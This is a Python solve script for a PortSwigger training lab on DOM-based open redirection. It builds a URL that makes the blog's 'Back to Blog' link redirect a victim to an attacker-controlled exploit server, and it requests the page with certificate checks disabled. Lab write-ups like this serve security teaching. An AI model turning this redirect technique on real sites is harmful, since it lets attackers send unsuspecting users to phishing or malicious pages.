#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: DOM-based open redirection.

The post page's "Back to Blog" onclick regexes `url=https?://(.+)` out of
`location` and assigns the match to `location.href`. No host check, so any
absolute URL redirects the victim.
"""

import argparse
import requests
import urllib3
from urllib.parse import quote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def build_url(lab: str, exploit: str, post_id: int = 4) -> str:
    return f"{lab}/post?postId={post_id}&url={quote(exploit + '/', safe=':/')}"


def main():
    parser = argparse.ArgumentParser(
        description="Solve DOM-based Lab 4: open redirection via Back-to-Blog onclick"
    )
    parser.add_argument("lab_url", help="Lab URL")
    parser.add_argument("exploit_url", help="Exploit server URL (redirect destination)")
    parser.add_argument("--post-id", type=int, default=4, help="Blog post ID to use (default 4)")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    exploit = args.exploit_url.rstrip("/")

    url = build_url(lab, exploit, args.post_id)
    print(f"[+] Exploit URL:\n    {url}")

    s = requests.Session()
    s.verify = False
    r = s.get(url)
    if "Back to Blog" in r.text:
        print("[+] Blog post loaded — 'Back to Blog' link present")
    else:
        print("[-] Blog post page didn't load as expected")

    print('[*] Open the URL in a browser and click "Back to Blog" to trigger the redirect')


if __name__ == "__main__":
    main()
